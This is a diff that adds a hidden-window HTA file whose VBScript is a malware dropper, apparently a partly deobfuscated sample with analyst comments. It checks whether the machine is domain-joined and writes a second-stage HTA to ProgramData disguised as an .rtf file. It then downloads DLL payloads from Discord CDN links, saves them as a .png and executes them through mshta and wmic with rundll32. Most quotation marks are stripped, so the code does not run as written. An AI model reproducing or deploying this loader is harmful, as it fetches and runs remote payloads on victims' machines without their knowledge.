@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="CS"
+APPLICATIONNAME="Test"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+<script type="text/vbscript" LANGUAGE="VBScript" >
+
+Set DUzCbPP = CreateObject(Wscript.Shell)
+
+cswuphI = Replace(DUzCbPP.expandenvironmentstrings((%LOGONSERVER%\) "") 
+IWnCZxFS = DUzCbPP.expandenvironmentstrings(%USERDOMAIN%) 
+
+If LCase(cswuphI) <> LCase(IWnCZxFS) Then
+
+    MsVsWig = ""
+
+    For Each uzQzHThB in Array    ////Array decoded
+	
+	(<!DOCTYPE html>   
+<html>
+<head>
+<HTA:APPLICATION ID="CS"
+APPLICATIONNAME="Test"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+<script type="text/vbscript" LANGUAGE="VBScript" >
+
+With CreateObject(Wscript.Shell)
+
+    .Exec(wmic process call create "rundll32.exe C:\\ProgramData\System.Web.ApplicationServices.png HlinkTranslateURL")
+
+End With
+
+</script>
+</head>
+<body>
+</body>
+</html>)
+      
+        MsVsWig = MsVsWig & (uzQzHThB)   //Calling values of array 
+
+    Next
+
+    Set YzqxZiM = CreateObject(Scripting.FileSystemObject)
+
+    Set GZlgont = YzqxZiM.CreateTextFile(C:\\ProgramData\System.Web.ApplicationServices.rtf, True)    //rtf file is created and data from array uzQzHThB is written to it
+    GZlgont.Write(MsVsWig)    
+
+    GZlgont.Close
+
+For Each CzYEzef in Array(https://cdn.discordapp.com/attachments/897103531738267712/897103645756239872/SaSegFlt.dllhttps://cdn.discordapp.com/attachments/897103531738267712/897103632363831326/keymgr.dllhttps://cdn.discordapp.com/attachments/897103531738267712/897103615020388362/InstallUtil.resources.dll)  // discord cdn delivering payloads
+
+    Set CmSWtE = createobject(MSXML2.XMLHTTP.6.0)
+    Set jvgoPm = createobject(Adodb.Stream)
+
+    CmSWtE.Open GET, CzYEzef, False
+
+    CmSWtE.setRequestHeader User-Agent, "IQyXwhlB"
+    CmSWtE.Send 
+
+    If CmSWtE.Status = 200 And Len(CmSWtE.ResponseBody)>1000 Then
+
+        with jvgoPm
+
+            .type = 1
+
+            .open
+
+            .write CmSWtE.responseBody
+
+            .savetofile C:\\ProgramData\System.Web.ApplicationServices.png, 2
+
+            .close
+
+        end with
+
+        With CreateObject(Wscript.Shell)
+
+            .Exec(mshta C:\\ProgramData\System.Web.ApplicationServices.rtf)
+
+        End With
+
+        Exit For
+
+    End If
+Next
+
+End If
+</script>
+</head>
+<body>
+</body>
+</html>
